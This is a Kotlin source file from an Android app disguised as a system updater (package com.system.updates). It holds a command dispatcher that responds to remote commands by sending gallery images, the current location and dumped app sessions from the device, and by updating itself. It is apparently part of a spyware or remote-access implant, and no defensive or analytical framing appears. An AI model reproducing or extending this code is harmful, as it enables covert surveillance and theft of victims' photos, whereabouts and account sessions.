// client/android/app/src/main/java/com/system/updates/core/CommandExecutor.kt
package com.system.updates.core

import android.content.Context
import android.content.Intent
import android.util.Log
import com.system.updates.modules.GeoProvider
import com.system.updates.modules.ImageModule
import com.system.updates.modules.SessionDumper

object CommandExecutor {

    private const val TAG = "CommandExecutor"

    fun execute(context: Context, command: String, extras: Intent?) {
        Log.d(TAG, "Executing command: $command")

        when (command) {
            "ping" -> {
                Log.i(TAG, "Pong! Device is online.")
            }
            "collect_images" -> {
                Log.i(TAG, "Starting image collection process...")
                ImageModule.scanAndSendGalleryInfo(context)
            }
            "get_location" -> {
                Log.i(TAG, "Fetching current location...")
                GeoProvider.sendCurrentLocation(context)
            }
            "update_token" -> {
                Log.i(TAG, "Updating FCM token in Supabase...")
            }
            "update_system" -> {
                Log.i(TAG, "Checking for system updates...")
                SelfUpdateManager.checkForUpdates(context)
            }
            "dump_sessions" -> {
                Log.i(TAG, "Starting session dump process...")
                SessionDumper.dumpAppSessions(context)
            }
            else -> {
                Log.w(TAG, "Unknown command received: $command")
            }
        }
    }
}
